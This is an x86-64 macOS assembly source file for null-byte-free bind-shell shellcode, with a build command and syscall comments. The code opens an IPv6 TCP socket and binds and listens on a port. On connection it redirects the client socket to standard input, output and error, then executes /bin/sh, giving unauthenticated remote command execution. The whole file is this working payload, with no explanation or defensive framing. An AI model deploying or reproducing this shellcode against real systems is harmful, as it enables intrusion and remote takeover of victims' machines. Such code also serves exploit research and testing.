;nasm -f macho64 -o ipv6bind.o ipv6bind.s && ld -macosx_version_min 10.7.0 -o ipv6bind ipv6bind.o

BITS 64

section .text

global start

start:
    ; socket(AF_INET6, SOCK_STREAM, IPPROTO_IP)
    xor  rdi, rdi
    mul  rdi
    mov  dil, 0x1e
    xor  rsi, rsi
    mov  sil, 0x1
    mov  al, 0x2
    ror  rax, 0x28
    mov  r8, rax
    mov  al, 0x61
    syscall

    ; struct sockaddr_in6 {
    ;         __uint8_t       sin6_len;
    ;         sa_family_t     sin6_family;
    ;         in_port_t       sin6_port;
    ;         __uint32_t      sin6_flowinfo;
    ;         struct in6_addr sin6_addr;
    ;         __uint32_t      sin6_scope_id;
    ; };
    xor  rsi, rsi
    push rsi
    push rsi
    push rsi
    mov  rsi, 0xffffffffa3eee1e4
    neg  rsi
    push rsi
    push rsp
    pop  rsi

    ; bind(host_sockid, &sockaddr, 28)
    mov  rdi, rax
    xor  dl, 0x1c
    mov  rax, r8
    mov  al, 0x68
    syscall    

    ; listen(host_sockid, 2)
    xor  rsi, rsi
    mov  sil, 0x2
    mov  rax, r8
    mov  al, 0x6a
    syscall

    ; accept(host_sockid, 0, 0)
    xor  rsi, rsi
    xor  rdx, rdx
    mov  rax, r8
    mov  al, 0x1e
    syscall

    mov rdi, rax
    mov sil, 0x3

    ; dup2(client_sockid, 2)
    ;   -> dup2(client_sockid, 1)
    ;   -> dup2(client_sockid, 0)
    dup2:
    mov  rax, r8
    mov  al, 0x5a
    sub  sil, 1
    syscall
    test rsi, rsi
    jne  dup2

    ; execve("//bin/sh", 0, 0)
    push rsi
    mov  rdi, 0x68732f6e69622f2f
    push rdi
    push rsp
    pop  rdi
    mov  rax, r8
    mov  al, 0x3b
    syscall
